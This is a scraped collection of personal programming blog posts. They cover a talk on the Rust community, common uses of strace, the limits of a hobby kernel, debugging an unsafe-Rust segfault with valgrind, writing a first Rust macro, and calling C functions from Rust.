\n \nWhat I don't see as much of as I'd like is resources for people who know how to program, or know Rust, and really want to take their skills to the next level. I think the Rust community is really well placed to help people do this.\n \n \nWriting down information like this for developers who might already have 5 or 10 years of experiences is where I spend almost all my time.\n \n\n \n \n\n \n \n \n \n \n \nAnd while you're writing down cool things to help people level up -- remember that a lot of systems things aren't really that hard. People can learn harder things than you think they can if you explain it in a way that makes sense.\n \n \nI think computer networking is a really good example of this -- a lot of people get really intimidated by networking, but a lot of the core concepts like IP addresses and ports and packets are not really that hard, and once you understand them you can learn a lot.\n \n \nI wrote a zine called \"linux debugging tools you'll love\" that talks about ngrep, tcpdump, strace, etc. And somebody tweeted at me saying he was using it to teach his 8 year old! What? So I'm not totally sure I believe that the 8 year old is using tcpdump. But maybe I'm wrong!! Who am I to say that?\n \n\n \nSo I've discovered that the audience for clear writing about systems programming is huge. A lot bigger than you might think.\n \n \n \n\n \n \n \n \n \n(the  zine  I wrote)\n \n \n\n \n \n \n \n \n \nI'm really happy about the Rust community because there are a ton of people in this room who know about Linux and networking and concurrency and all these topics that have historically been really hard to learn about.\n \n \nBut now many of you are gathered here inside this really welcoming and wonderful community! This feels magical to me and like it's going to be a really good thing for programming as a whole.\n \n\n \n \n\n \n \n \n \n \n \nSo, to close, for real, I'm excited for this to be a place where people can walk in asking \"what's a system call?\"\n \n\n \n \n\n \n \n \n \n \n \nand wake up a year later knowing how to do systems programming, and thinking it wasn't really that hard.\n \n\n \n \n\n \n \n \n \n \n \nthis is a picture I commissioned of myself at the san franscisco zine festival from  @ohmaipie  as a wizard.\n \n \n \n\n \n \n \n \n \n♥♥♥\n \n \n\n"},
{"url": "https://jvns.ca/blog/2021/04/03/what-problems-do-people-solve-with-strace/", "title": "What problems do people solve with strace?", "content": "\n     \n\n Yesterday I  asked on Twitter about what problems people are solving with strace  and\nas usual everyone really delivered! I got 200 answers and then spent a bunch of\ntime manually categorizing them into 9 categories of problems. \n\n All of the problems are about either finding files a program depends on,\nfiguring out why a program is stuck or slow, or finding out why a program is\nfailing. These generally matched up with what I use strace for myself, but\nthere were some things I hadn’t thought of too! \n\n I’m not going to explain what strace is in this post but I have a  free zine about it  and  a talk  and  lots of blog posts . \n\n problem 1: where’s the config file? \n\n The #1 most popular problem was “this program has a configuration file and I don’t\nknow where it is”. This is probably my most common use for strace too, because it’s such a simple question. \n\n This is great because there are a million ways for a program to document where\nits config file is (in a man page, on its website, in  --help , etc), but\nthere’s only one way for it to actually open it (with a system call!) \n\n problem 2: what other files does this program depend on? \n\n You can also use strace to find other types of files a program depends on, like: \n\n \n dynamically linked libraries (“why is my program loading the wrong version of this  .so  file?“) like  this ruby problem I debugged in 2014 \n where it’s looking for its Ruby gems (Ruby specifically came up a few times!) \n SSL root certificates \n a game’s save files \n a closed-source program’s data files \n which node_modules files aren’t being used \n \n\n problem 3: why is this program hanging? \n\n You have a program, it’s just sitting there doing nothing, what’s going\non? This one is especially easy to answer because a lot of the time you just\nneed to run  strace -p PID  and look at what system call is currently running.\nYou don’t even have to look through hundreds of lines of output! \n\n The answer is usually ‘waiting for some kind of I/O’. Some possible answers for “why is this stuck” (though there are a lot more!): \n\n \n it’s polling forever on a  select() \n it’s  wait() ing for a subprocess to finish \n it’s making a network request to something that isn’t responding \n it’s doing  write()  but it’s blocked because the buffer is full \n it’s doing a  read()  on stdin and it’s waiting for input \n \n\n Someone also gave a nice example of using strace to debug a stuck  df : ‘with strace df -h you can find the stuck mount and unmount it”. \n\n problem 4: is this program stuck? \n\n A variation on the previous one: sometimes a program has been running for\nlonger than you expected, and you just want to know if it’s stuck or of it’s\nstill making progress. \n\n As long as the program makes system calls while it’s running, this is super\neasy to answer with strace – just strace it and see if it’s making new\nsystem calls! \n\n problem 5: why is this program slow? \n\n You can use strace as a sort of coarse profiling tool –  strace -t  will show\nthe timestamp of each system call, so you can look for big gaps and find the culprit. \n\n Here are 9 short stories from Twitter of people using strace to debug “why is this program slow?”. \n\n \n Back in 2000, a Java-based web site that I helped support was dying under\nmodest load: pages loaded slowly, if at all. We straced the J2EE application\nserver and found that it was reading class files one. byte. at. a. time. Devs\nweren’t using BufferedReader, classic Java mistake. \n Optimizing app startup times… running strace can be an eye-opening\nexperience, in terms of the amount of unnecessary file system interaction\ngoing on (e.g. open/read/close on the same config file over and over again;\nloading gobs of font files over a slow NFS mount, etc) \n Asked myself why reading from session files in PHP (usually <100 bytes)\nwas incredibly slow. Turned out some  flock -syscalls took ~60s \n A program was behaving abnormally slow. Used strace to figure out it was\nre-initializing its internal pseudo-random number generator on every request\nby reading from /dev/random and exhausting entropy \n Last thing I remember was attaching to a job worker and seeing just how many network calls it was making (which was unexpected). \n Why is this program so slow to start?  strace shows it opening/reading the same config file thousands of times. \n Server using 100% CPU time randomly with low actual traffic. Turns out it’s hitting the number of open files limit accepting a socket, and retrying forever after getting EMFILE and not reporting it. \n A workflow was running super slow but no logs, ends up it was trying to do a post request that was taking 30s before timing out and then retrying 5 times… ends up the backend service was overwhelmed but also had no visibility \n using strace to notice that gethostbyname() is taking a long time to return (you can’t see the  gethostbyname  directly but you can see the DNS packets in strace) \n \n\n problem 6: hidden permissions errors \n\n Sometimes a program is failing for a mysterious reason, but the problem is just\nthat there’s some file that it doesn’t have permission to open. In an ideal\nworld programs would report those errors (“Error opening file /dev/whatever:\npermission denied”), but of course the world is not perfect, so strace can\nreally help with this! \n\n This is actually the most recent thing I used strace for: I was using an\nAxiDraw pen plotter and it printed out an inscrutable error message when I\ntried to start it. I  strace d it and it turned out that my user just didn’t\nhave permission to open the USB device. \n\n problem 7: what command line arguments are being used? \n\n Sometimes a script is running another program, and you want to know what\ncommand line flags it’s passing! \n\n A couple of examples from Twitter: \n\n \n find what compiler flags are actually being used to build some code \n a command was failing due to having too long a command line \n \n\n problem 8: why is this network connection failing? \n\n Basically the goal here is just to find which domain / IP address the network\nconnection is being made to. You can look at the DNS request to find the domain\nor the  connect  system call to find the IP. \n\n In general there are a lot of stories about using strace to debug network\nissues when  tcpdump  isn’t available for some reason or just because it’s what\nthe person is more familiar with. \n\n problem 9: why does this program succeed when run one way and fail when run in another way? \n\n For example: \n\n \n the same binary works on one machine, fails on another machine \n works when you run it, fails when spawned by a systemd unit file \n works when you run it, fails when you run it as “su - user /some/script” \n works when you run it, fails when run as a cron job \n \n\n Being able to compare the strace output in both cases is very helpful. Though\nmy first step when debugging “this works as my user and fails when run in a\ndifferent way on the same computer” would be “look at my environment\nvariables”. \n\n problem 10: how does this Linux kernel API work? \n\n Another one quite a few people mentioned is figuring out how a Linux kernel\nAPI (for example netlink, io_uring, hdparm, I2C, etc). \n\n Even though these APIs are usually documented, sometimes the documentation is\nconfusing or there aren’t very many examples, so often it’s easier to just\nstrace an existing application and see how it interacts with the Linux kernel. \n\n problem 11: general reverse engineering \n\n strace is also great for just generally figuring out “how does this program\nwork?“.  As a simple example of this, here’s a blog post on  figuring out how killall works using strace . \n\n what I’m doing with this: slowly building some challenges \n\n The reason I’m thinking about this is that I’ve been slowly working on some\nchallenges to help people practice using strace and other command line tools.\nThe idea is that you’re given a problem to solve, a terminal, and you’re free\nto solve it in any way you want. \n\n So my goal is to use this to build some practice problems that you can solve\nwith strace that reflect the kinds of problems that people actually use it for\nin real life. \n\n that’s all! \n\n There are probably more problems that can be solved with strace that I haven’t\ncovered here – I’d love to hear what I’ve missed! \n\n I really loved seeing how many of the same uses came up over and over and over\nagain – at least 20 different people replied saying that they use strace to\nfind config files. And as always I think it’s really delightful how such a\nsimple tool (“trace system calls!”) can be used to solve so many different\nkinds of problems. \n\n"},
{"url": "https://jvns.ca/blog/2014/01/03/what-my-kernel-doesnt-do/", "title": "Some things my kernel can't do", "content": "\n      I’m working on a talk for  CUSEC  about how\nkernel programming is something that normal humans can do (albeit with\nsome pain and suffering). \n\n Most people will be pretty unfamiliar with what a kernel is or does.\nI’m thinking of explaining it in terms of the kernel I wrote at Hacker\nSchool, and what it can’t do. \n\n Kernel programming has become a lot more concrete to me – I now\ntotally feel like I could write a production OS if I were given some\nhardware, 20 years and an army of volunteers. \n\n So here are some pretty “basic” things that my kernel can’t do. I’m\nnot trying to give an exhaustive list here, but a flavor for what’s\ninvolved. \n\n \n\n The idea is that once you know what a kernel does, you can pick a\nThing and a Kernel, and then dive into it and ask “okay, what  is  the\nLinux kernel’s system for tracking processes?“. Then you can find this\npage\n about the process table in Linux 2.4 ,\nread some of it, and it’s probably different in the 3.x kernel, but\nnow you know more. \n\n \n Communicate with the hard drive\n\n \n Even if it could, it doesn’t understand any filesystems \n \n Communicate with the network card to connect to the Internet\n\n \n Even if it could, it doesn’t understand any network protocols like\nTCP/IP \n \n Get out of text-only mode to display graphics \n Run programs securely, so that they can’t overwrite each others’\nmemory \n Run more than one program at a time (“scheduling”) \n Know what time it is \n Allow a process to sleep for a fixed amount of time \n Put the computer to sleep / turn off the computer \n \n\n Some higher-level things that depend on those: \n\n \n Have a system for tracking processes \n Have a way to manage processes (like signals) \n File permissions \n Provide a way for user programs to interact with hardware (like\n /dev/* ) \n \n\n These are all pretty approachable concepts (I think). I think I’m not\ngoing to talk about virtual memory because I don’t know if I can\nexplain it well. \n\n That’s a pretty long list. What  can  my kernel do? \n\n \n Print to the screen \n Understand keyboard inputs \n Run programs, almost \n(this isn’t working yet, but I think I’m not too far away) \n \n\n So not much :) \n"},
{"url": "https://jvns.ca/blog/2017/12/23/segfault-debugging/", "title": "Debugging a segfault in my Rust program", "content": "\n     \n\n Hello! Yesterday I finished debugging a segfault. It was (in retrospect) a pretty easy thing to fix\nbut I learned a few things from fixing it and so I thought I’d share. \n\n I think this was a great example of Allison Kaptur’s  love your bugs  principle – it was a relatively simple\nbug, but it was a new class of bug  for me  and so it was a good learning opportunity! \n\n why do segfaults happen? \n\n Really quickly – a segfault is when your program tries to access an area that it’s not allowed to\nhappen. This can happen for a few reasons: \n\n \n You tried to dereference (“access”) a null pointer ( 0x0  is an address! dereferencing it does not\nwork!) \n You did an out-of-bounds memory access (like you went past the end of an array) and some code\nsomewhere else set up “guard pages” around that memory so that your program would segfault. You can\nprotect memory with the  mprotect system call . This is a\nuseful thing because it’s often better to fail early than to access uninitialized memory. \n You accidentally put something into a pointer that wasn’t supposed to be a pointer (like.. just\nsome random bytes) and then tried to dereference that pointer \n You tried to write to a read-only part of memory \n \n\n I haven’t dealt with segfaults much so having a rough categorization of the possible reasons is\nreally helpful to me. There are probably more reasons I don’t know about. \n\n why do segfaults happen in Rust? \n\n Segfaults happen in Rust for all the same reasons, but Rust also offers compile-time guarantees that\nyour program won’t segfault. So, as far as I understand it, there are 2 possible reasons your\n Rust  program can segfault: \n\n \n you wrote unsafe code in a way that violates Rust’s memory safety guarantees \n The Rust compiler has a bug \n \n\n option 1 is obviously much more likely, and of course it’s what was happening in my program: I had\nsome unsafe code in my program and I’d done something wrong. So it was just a matter of figuring out\nwhat I’d done wrong exactly in my unsafe code! \n\n my segfault \n\n So, I have a program that grabs a stack trace from a Ruby program. The second time it got a stack trace,\n(not the first!) it was always segfaulting. here’s what that looked like in my shell (fish). I\nalready knew what “terminated by signal SIGSEGV” (it’s a segfault!) meant so that was good! \n\n fish: Process 29420, “sudo” “sudo  ./target/debug/ruby-stack…”\nterminated by signal SIGSEGV (Address boundary error)\n \n\n I’m going to go through the steps I went through to debug this segfault. It’s artifically cleaned up\na bit to be more readable (when I was actually debugging it was a bit more confusing/chaotic), but\nit’s mostly accurate. \n\n step 1: figure out where the segfault is happening \n\n I started out by putting in a lot of print statements to figure out where the segfault was happening\nexactly. It turned that it happened after the function  get_stack_trace returned . \n\n I knew that in Rust, the compiler inserts code to deallocate (“drop”) any pointers that need to be\ndeallocated at the end of the function. So I figured that my segfault was happening during\ndeallocation somewhere (spoiler: this was true.) \n\n step 2: run valgrind \n\n I’d never run valgrind before, but I knew it was a tool for detecting memory problems (like\nuse-after-free or using uninitialized memory). So I decided to run valgrind to see if it would help\nme. \n\n Here’s what the output of valgrind looked like: It’s kind of big but I think it’s interesting so I’m\ngoing to include all of it. \n\n ==24054== Invalid read of size 8\n==24054==    at 0x70BFAF: arena_run_size_get (arena.c:2139)\n==24054==    by 0x70BFAF: arena_run_dalloc (arena.c:2158)\n==24054==    by 0x70BFAF: arena_dalloc_large_locked_impl (arena.c:3059)\n==24054==    by 0x70BFAF: je_arena_dalloc_large (arena.c:3076)\n==24054==    by 0x15CBDD: _$LT$alloc..heap..Heap$u20$as$u20$alloc..allocator..Alloc$GT$::dealloc::hdb5e62b8e81170c3 (heap.rs:104)\n==24054==    by 0x15E1CF: _$LT$alloc..raw_vec..RawVec$LT$T$C$$u20$A$GT$$GT$::dealloc_buffer::h21ec0f0ea4d7e8ea (raw_vec.rs:687)\n==24054==    by 0x15F544: _$LT$alloc..raw_vec..RawVec$LT$T$C$$u20$A$GT$$u20$as$u20$core..ops..drop..Drop$GT$::drop::h680e0cd5f2ba0db0 (raw_vec.rs:696)\n==24054==    by 0x15AA24: core::ptr::drop_in_place::ha5d166fd802b1dc7 (in /home/bork/work/ruby-stacktrace/target/debug/ruby-stacktrace)\n==24054==    by 0x15B02E: core::ptr::drop_in_place::hba5f72a97ec2ed1d (in /home/bork/work/ruby-stacktrace/target/debug/ruby-stacktrace)\n==24054==    by 0x154B17: ruby_stacktrace::stack_trace::get_stack_trace::h8cbbf1b7ce92f028 (lib.rs:237)\n==24054==    by 0x136BC3: ruby_stacktrace::main::ha677e8f07d7d709d (ruby-stacktrace.rs:69)\n==24054==    by 0x6FA24E: __rust_maybe_catch_panic (lib.rs:101)\n==24054==    by 0x6E32D3: UnknownInlinedFun (panicking.rs:459)\n==24054==    by 0x6E32D3: catch_unwind<closure,()> (panic.rs:365)\n==24054==    by 0x6E32D3: std::rt::lang_start::hb3d6b270f8135e26 (rt.rs:58)\n==24054==    by 0x136FBD: main (in /home/bork/work/ruby-stacktrace/target/debug/ruby-stacktrace)\n==24054==  Address 0x170b02918 is not stack'd, malloc'd or (recently) free'd\n==24054== \n==24054== Invalid write of size 8\n==24054==    at 0x703C63: arena_run_heap_remove (arena.c:114)\n==24054==    by 0x70C009: arena_run_coalesce (arena.c:2061)\n==24054==    by 0x70C009: arena_run_dalloc (arena.c:2188)\n==24054==    by 0x70C009: arena_dalloc_large_locked_impl (arena.c:3059)\n==24054==    by 0x70C009: je_arena_dalloc_large (arena.c:3076)\n==24054==    by 0x15CBDD: _$LT$alloc..heap..Heap$u20$as$u20$alloc..allocator..Alloc$GT$::dealloc::hdb5e62b8e81170c3 (heap.rs:104)\n==24054==    by 0x15E1CF: _$LT$alloc..raw_vec..RawVec$LT$T$C$$u20$A$GT$$GT$::dealloc_buffer::h21ec0f0ea4d7e8ea (raw_vec.rs:687)\n==24054==    by 0x15F544: _$LT$alloc..raw_vec..RawVec$LT$T$C$$u20$A$GT$$u20$as$u20$core..ops..drop..Drop$GT$::drop::h680e0cd5f2ba0db0 (raw_vec.rs:696)\n==24054==    by 0x15AA24: core::ptr::drop_in_place::ha5d166fd802b1dc7 (in /home/bork/work/ruby-stacktrace/target/debug/ruby-stacktrace)\n==24054==    by 0x15B02E: core::ptr::drop_in_place::hba5f72a97ec2ed1d (in /home/bork/work/ruby-stacktrace/target/debug/ruby-stacktrace)\n==24054==    by 0x154B17: ruby_stacktrace::stack_trace::get_stack_trace::h8cbbf1b7ce92f028 (lib.rs:237)\n==24054==    by 0x136BC3: ruby_stacktrace::main::ha677e8f07d7d709d (ruby-stacktrace.rs:69)\n==24054==    by 0x6FA24E: __rust_maybe_catch_panic (lib.rs:101)\n==24054==    by 0x6E32D3: UnknownInlinedFun (panicking.rs:459)\n==24054==    by 0x6E32D3: catch_unwind<closure,()> (panic.rs:365)\n==24054==    by 0x6E32D3: std::rt::lang_start::hb3d6b270f8135e26 (rt.rs:58)\n==24054==    by 0x136FBD: main (in /home/bork/work/ruby-stacktrace/target/debug/ruby-stacktrace)\n==24054== Address 0x8 is not stack'd, malloc'd or (recently) free'd\n \n\n So there were 2 errors here: an invalid read and an invalid write. It complained about 2 addresses:\n Address 0x170b02918  and  Address 0x8 . I knew both of those were invalid addresses but I had no\nidea where they were coming from. \n\n valgrind was pretty useful though! It did confirm that the segfault was definitely happening during\ndeallocation – you can see  drop_in_place ,  Drop ,  dealloc_buffer ,  je_arena_dealloc_large …\nin the stack trace. So SOMETHING definitely was going wrong when deallocating this memory. But what? \n\n step 3: identify which deallocation exactly was the problem \n\n A cool thing you can do in Rust is – you can run  std::mem::forget(some_variable) . This tells Rust\nbasically to leak that memory and to not deallocate it. I had a variable called  cfps  that I\nsuspected was the problem. And sure enough, when I added  std::mem::forget(cfps) , the segfault\nstopped happening. Nice! I still didn’t know what I’d done  wrong  yet but I knew which variable\nwas the problem. \n\n step 4: try switching allocators \n\n So I noticed that my segfault was happening inside of jemalloc somewhere. Someone on the internet\nsomewhere said that valgrind doesn’t work well with jemalloc (I don’t know if that’s actually\ntrue!), so I thought I’d try switching allocators to see if valgrind would give me less confusing\nresults. \n\n Here’s how you switch to the system allocator. \n\n #![cfg_attr(rustc_nightly, feature(test))]\n#![feature(alloc_system)]\n\n#![feature(alloc_system)]\n#![feature(global_allocator, allocator_api)]\n\nextern crate alloc_system;\n\nuse alloc_system::System;\n\n#[global_allocator]\nstatic A: System = System;\n \n\n When I switched to the system allocator a very surprising thing happened: my program didn’t segfault\nanymore. What? Why???? \n\n step 5: WHY DOES IT SEGFAULT WITH JEMALLOC BUT NOT THE SYSTEM ALLOCATOR \n\n step 5 was not a constructive step but instead just a lot of confusion. I did not know how this\ncould happen and I didn’t have an idea for a next step. \n\n I tweeted “aaa my program segfaults when I compile it with jemalloc but when I switch to the system\nallocator to try to debug it works fine??“. It was like 1:30am so I went to sleep. \n\n step 6: reproduce my weird jemalloc problem in a minimal way \n\n I was Very Confused at this point so I decided, well, maybe I can ask someone to help me. But in\norder to ask someone for help I needed to take my chaotic mess of a program and show someone a\nsimple program with the same problem: “it segfaults with jemalloc but not with system malloc”. \n\n I managed to reproduce my issue on the Rust playground in a really simple way: \n\n Basically this program tries to cast a 560-byte vec into a vec with 7 elements, where each element\nis an 80-byte struct. \n\n \n system malloc version (no segfault) \n jemalloc version (segfaults) \n \n\n Nice! I felt really happy with myself: I’d taken the weird confusing behavior that I didn’t\nunderstand and gotten it to happen in a very small self-contained program (less than 50 lines!). \n\n step 7: realize what I did wrong \n\n I started writing a question for the Rust forum to ask for help figuring out what I did wrong. As\noften happens when I try to explain what’s going on in writing, halfway through writing the question\nI figured it out for myself. \n\n This is the offending code. Basically it takes a vector of 560 bytes and unsafely changes it into a\nvector of 7 80-byte structs. \n\n // make a vector with 560 bytes\nlet mut ret: Vec<u8> = Vec::with_capacity(560);\nfor i in 0..560 {\n    ret.push(i);\n}\n\nlet p = ret.as_mut_ptr();\n\n// make a 7-element vector of 80-byte structs instead\n// (7 * 80 = 560)\nlet rebuilt: Vec<size_80_struct> = unsafe { \n    mem::forget(ret);\n    Vec::from_raw_parts(\n        p as *mut size_80_struct,\n        7,\n        560,\n        )\n};\n \n\n it turns out that there are 2 things wrong with this code \n\n \n the third argument to  from_raw_parts  is the length, not the number of bytes (so it should be 7,\nnot 560) \n I went and read the  Vec::from_raw_parts  docs for the 20th time and finally read this:  ptr's T needs to have the same size and alignment as it was allocated with. .  size_80_struct  definitely does not have the same size as a byte so that’s no good. \n \n\n how I fixed it \n\n Basically instead of trying to cast my memory by creating a new vec, I created a slice instead. \n\n let mut cfps: Vec<u8> = get_cfps(&thread, source_pid);\nlet slice: &[rb_control_frame_struct] = unsafe { std::slice::from_raw_parts(cfps.as_mut_ptr() as *mut rb_control_frame_struct, cfps.capacity() as usize / mem::size_of::<rb_control_frame_struct>() as usize) };\n \n\n I don’t  mem::forget  the vec anymore, I just let create a slice view of it, iterate over that slice\nand then let Rust deallocate the  Vec<u8>  at the end of the function. \n\n And my program doesn’t segfault for now! The reason this works (and is safe!) is that  Vec  are\nalways backed by contiguous memory – I was worried that they weren’t, but literally the first\nsentence in the Rust documentation on  Vec s says: \n\n \n A contiguous growable array type, written Vec  but pronounced ‘vector’. \n \n\n So since a Vec is contiguous memory I can just cast it to a slice and iterate over that slice\nsafely. I think. \n\n things I learned \n\n segfaulting is a feature . When I complained that this code segfaulted with jemalloc but not libc\nmalloc, someone made a comment like – “yeah, jemalloc detects things that valgrind doesn’t”. So in\na way, the program that segfaulted was  better  than the program that didn’t, because it was\npicking up a subtle problem that could bite me later if I didn’t fix it. I think this is the same\nreason people like to use mprotect. \n\n asan/tsan exist :: There are things in clang called “ThreadSanitizer/AddressSanitizer” (“tsan”/“asan”) that can do sorta the same thing as valgrind does, but with way less overhead. I did not get them to work this time around but there’s documentation about how to use them with Rust  at  https://github.com/japaric/rust-san  and it seems really cool. \n\n leaking memory is safe . I was kind of surprised to learn that leaking memory is safe in Rust (you\ncan do it on purpose with  mem::forget !). I think usually safe Rust code won’t have leaks but it’s not a strict guarantee. Rust also  doesn’t  guarantee that you code won’t segfault if you write safe code!! (“we install a guard page after the stack to safely terminate the program with a segfault on stack overflows”) The best reference for this is in the official Rust documentation:  Behavior considered undefined  and  Behavior not considered unsafe . \n\n When I originally read those docs I thought that “undefined behavior” and “unsafe” were synonyms. It\nturns out “undefined behavior” and “unsafe” are closely related but not the same thing!  Manish\nGoregaokar wrote a  nice explanation of the difference between undefined and unsafe  in response to\nthis post. ( also on twitter ) \n\n This is a bit confusing to me because safe Rust programs usually  won’t  have memory leaks or\nsegfault, and that’s part of Rust’s memory safety. But it seems that there also aren’t strict\nguarantees that segfaults/memory leaks won’t happen. I have more to learn here! \n\n read the docs around unsafe functions really carefully . Using unsafe functions can be safe! You\njust need to be careful to make sure to call those functions in a way that maintains the invariants\nthat Rust expects. Rust has really clear documentation about what the expectations of unsafe\nfunctions are. I will try to be more careful about actually reading them in the future :) \n\n jemalloc does some things I don’t understand . One of the jemalloc devs gave me this very\ninteresting\nanswer to “why does this code segfault with jemalloc but not libc malloc”: (from  this tweet ) \n\n \n jemalloc caches memory thread-locally, bucketed by the size reserved for it, so it doesn’t have to touch the central allocator as often (risking lock contention). We can dodge some metadata lookups if the user tells us the size of the memory being freed; if we think an N-byte allocation is really M > N bytes, then we’ll return it for an M-byte request (stomping over someone else data at bytes M-N up to N). \n \n\n I think this was what was happening – I’d set the capacity of the new vector incorrectly (560\ninstead of 7) and so jemalloc took the (wrong) hint about the how big the allocation being freed was\nand that caused a segfault somehow. \n\n this was cool! \n\n this was a fun bug and I know a few more things about memory safety than I did before I ran into it.\nYay! One of my favourite things about learning more Rust is that when I run into bugs in Rust\nprograms, I often learn new cool things about systems (valgrind! asan/tsan! jemalloc! guard pages!). \n\n"},
{"url": "https://jvns.ca/blog/2017/12/24/my-first-rust-macro/", "title": "My first Rust macro", "content": "\n     \n\n Last night I wrote a Rust macro for the first time!! The most striking thing to me about this\nwas how  easy  it was – I kind of expected it to be a weird hard finicky thing, and instead I\nfound that I could go from “I don’t know how macros work but I think I could do this with a macro”\nto “wow I’m done” in less than an hour. \n\n I used  these examples  to figure out how to write my macro. \n\n what’s a macro? \n\n There’s more than one kind of macro in Rust – \n\n \n macros defined using  macro_rules  (they have an exclamation mark and you call them like functions –  my_macro!() ) \n “syntax extensions” / “procedural macros” like  #[derive(Debug)]  (you put these like annotations on your functions) \n built-in macros like  println! \n \n\n Macros in Rust  and  Macros in Rust part II  seems like a nice overview of the different kinds with examples \n\n I’m not actually going to try to explain what a macro  is , instead I will just show you what I\nused a macro for yesterday and hopefully that will be interesting. I’m going to be talking about\n macro_rules! , I don’t understand syntax extension/procedural macros yet. \n\n compiling the  get_stack_trace  function for 30 different Ruby versions \n\n I’d written some functions that got the stack trace out of a running Ruby program\n( get_stack_trace ). But the function I wrote only worked for Ruby 2.2.0 – here’s what it looked\nlike. Basically it imported some structs from  bindings::ruby_2_2_0  and then used them. \n\n use bindings::ruby_2_2_0::{rb_control_frame_struct, rb_thread_t, RString};\nfn get_stack_trace(pid: pid_t) -> Vec<String> {\n    // some code using rb_control_frame_struct, rb_thread_t, RString\n}\n \n\n Let’s say I wanted to instead have a version of  get_stack_trace  that worked for Ruby 2.1.6.\n bindings::ruby_2_2_0  and  bindings::ruby_2_1_6  had basically all the same structs in them. But\n bindings::ruby_2_1_6::rb_thread_t  wasn’t the  same  as  bindings::ruby_2_2_0::rb_thread_t , it\njust had the same name and most of the same struct members. \n\n So I could implement a working function for Ruby 2.1.6 really easily! I just need to basically\nreplace  2_2_0  for  2_1_6 , and then the compiler would generate different code (because  rb_thread_t  is\ndifferent). Here’s a sketch of what the Ruby 2.1.6 version would look like: \n\n use bindings::ruby_2_1_6::{rb_control_frame_struct, rb_thread_t, RString};\nfn get_stack_trace(pid: pid_t) -> Vec<String> {\n    // some code using rb_control_frame_struct, rb_thread_t, RString\n}\n \n\n what I wanted to do \n\n I basically wanted to write code like this, to generate a  get_stack_trace  function for\nevery Ruby version. The code inside  get_stack_trace  would be the same in every case, it’s just the\n use bindings::ruby_2_1_3  that needed to be different \n\n pub mod ruby_2_1_3 {\n    use bindings::ruby_2_1_3::{rb_control_frame_struct, rb_thread_t, RString};\n    fn get_stack_trace(pid: pid_t) -> Vec<String> {\n        // insert code here\n    }\n}\npub mod ruby_2_1_4 {\n    use bindings::ruby_2_1_4::{rb_control_frame_struct, rb_thread_t, RString};\n    fn get_stack_trace(pid: pid_t) -> Vec<String> {\n        // same code\n    }\n}\npub mod ruby_2_1_5 {\n    use bindings::ruby_2_1_5::{rb_control_frame_struct, rb_thread_t, RString};\n    fn get_stack_trace(pid: pid_t) -> Vec<String> {\n        // same code\n    }\n}\npub mod ruby_2_1_6 {\n    use bindings::ruby_2_1_6::{rb_control_frame_struct, rb_thread_t, RString};\n    fn get_stack_trace(pid: pid_t) -> Vec<String> {\n        // same code\n    }\n}\n \n\n macros to the rescue! \n\n This really repetitive thing was I wanted to do was a GREAT fit for macros. Here’s what using\n macro_rules!  to do this looked like! \n\n macro_rules! ruby_bindings(\n    ($ruby_version:ident) => (\n    pub mod $ruby_version {\n        use bindings::$ruby_version::{rb_control_frame_struct, rb_thread_t, RString};\n        fn get_stack_trace(pid: pid_t) -> Vec<String> {\n            // insert code here\n        }\n    }\n));\n \n\n I basically just needed to put my code in and insert  $ruby_version  in the places I wanted it to go\nin. So simple! I literally just looked at an example, tried the first thing I thought would work,\nand it worked pretty much right away. \n\n (the  actual code  is more lines and messier but the usage of macros is exactly as simple in this example) \n\n I was SO HAPPY about this because I’d been worried getting this to work would be hard but instead it\nwas so easy!! \n\n dispatching to the right code \n\n Then I wrote some super simple dispatch code to call the right code depending on which Ruby version\nwas running! \n\n     let version = get_api_version(pid);\n    let stack_trace_function = match version.as_ref() {\n        \"2.1.1\" => stack_trace::ruby_2_1_1::get_stack_trace,\n        \"2.1.2\" => stack_trace::ruby_2_1_2::get_stack_trace,\n        \"2.1.3\" => stack_trace::ruby_2_1_3::get_stack_trace,\n        \"2.1.4\" => stack_trace::ruby_2_1_4::get_stack_trace,\n        \"2.1.5\" => stack_trace::ruby_2_1_5::get_stack_trace,\n        \"2.1.6\" => stack_trace::ruby_2_1_6::get_stack_trace,\n        \"2.1.7\" => stack_trace::ruby_2_1_7::get_stack_trace,\n        \"2.1.8\" => stack_trace::ruby_2_1_8::get_stack_trace,\n        // and like 20 more versions\n        _ => panic!(\"OH NO OH NO OH NO\"),\n    };\n \n\n it works! \n\n I tried out my prototype, and it totally worked! The same program could get stack traces out the\nrunning Ruby program for all of the ~10 different Ruby versions I tried – it figured which\nRuby version was running, called the right code, and got me stack traces!! \n\n Previously I’d compile a version for Ruby 2.2.0 but then if I tried to use it for any other Ruby\nversion it would crash, so this was a huge improvement. \n\n There are still more issues with this approach that I need to sort out. The two main ones right now\nare: firstly the ruby binary that ships with Debian doesn’t have symbols and I need the address of\nthe current thread, and secondly it’s still possible that  #ifdefs  will ruin my day. \n\n"},
{"url": "https://jvns.ca/blog/2016/01/18/calling-c-from-rust/", "title": "Calling C from Rust", "content": "\n      Yesterday I asked  Kamal  how to call C code from Rust, for a project I’m thinking about. It turned out to be a little harder than I expected! Largely because I don’t know Rust well, and fixing compiler errors is nontrivial. 30 minutes and some number of inscrutable-to-me compiler errors later, we figured it out. \n\n I want to do something pretty simple – copy the string “Hello, world!” and print it. \n\n Here’s the Rust code that calls C. It doesn’t use any special libraries – just Rust. \n\n extern {\n    // Our C function definitions!\n    pub fn strcpy(dest: *mut u8, src: *const u8) -> *mut u8;\n    pub fn puts(s: *const u8) -> i32;\n}\n\nfn main() {\n    let x = b\"Hello, world!\\0\"; // our string to copy\n    let mut y = [0u8; 32]; // declare some space on the stack to copy the string into\n    unsafe {\n      // calling C code is definitely unsafe. it could be doing ANYTHING\n      strcpy(y.as_mut_ptr(), x.as_ptr()); // we need to call .as_ptr() to get a pointer for C to use\n      puts(y.as_ptr());\n    }\n}\n \n\n I’m mostly writing this down so that I don’t forget, but maybe it will be useful for you too! \n\n Along the way I found out that  cargo  (Rust’s build tool) is super easy to get started with – all you need to do is run \n\n $ cargo new --bin my-project\n$ cd my-project\n$ cargo run\n   Compiling my-project v0.1.0 (file:///home/bork/work/my-project)\n     Running `target/debug/my-project`\nHello, world!\n \n\n and you have a new Rust project that you can run with  cargo run ! \n\n Rust is way easier to install than it was in 2013, though I still find the error messages hard to understand. \n\n There might be more of these short project-notes posts to come – hopefully some of you will find them interesting! \n\n"},
